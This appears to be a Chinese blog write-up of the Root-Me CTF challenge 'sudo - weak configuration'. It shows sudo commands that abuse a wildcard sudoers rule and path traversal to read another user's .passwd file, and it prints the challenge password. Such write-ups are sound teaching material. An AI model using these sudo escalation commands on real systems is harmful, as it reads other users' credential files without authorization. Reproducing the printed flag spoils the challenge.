<!--yml
category: 未分类
date: 2022-04-26 14:20:35
-->

# CTF-rootme 题解之sudo - weak configuration_weixin_30663391的博客-CSDN博客

> 来源：[https://blog.csdn.net/weixin_30663391/article/details/99600320](https://blog.csdn.net/weixin_30663391/article/details/99600320)

link:[https://www.root-me.org/en/Challenges/App-Script/sudo-weak-configuration](https://www.root-me.org/en/Challenges/App-Script/sudo-weak-configuration)

app-script-ch1@challenge02:~$ **cat readme.md**
Vous devez réussir à lire le fichier .passwd situé dans le chemin suivant :
/challenge/app-script/ch1/ch1cracked/

You have to read the .passwd located in the following PATH :
/challenge/app-script/ch1/ch1cracked/                       

the password path is:**/challenge/app-script/ch1/ch1cracked/.passwd**

app-script-ch1@challenge02:~$ **sudo -l** 

Matching Defaults entries for app-script-ch1 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass,
    !mail_no_host, !mail_no_perms, !mail_no_user

User app-script-ch1 may run the following commands on challenge02:
    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/ch1/*

the file path which allowed for app-script-ch1-cracked is:**/challenge/app-script/ch1/ch1/**

**Solution 1:sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/ch1/*  ch1cracked/.passwd**

/bin/cat: /challenge/app-script/ch1/ch1/shared_notes: Permission denied
b3_c4r3full_w1th_sud0                //password

**Solution 2:sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/ch1/../ch1cracked/.passwd**

b3_c4r3full_w1th_sud0

The result is:b3_c4r3full_w1th_sud0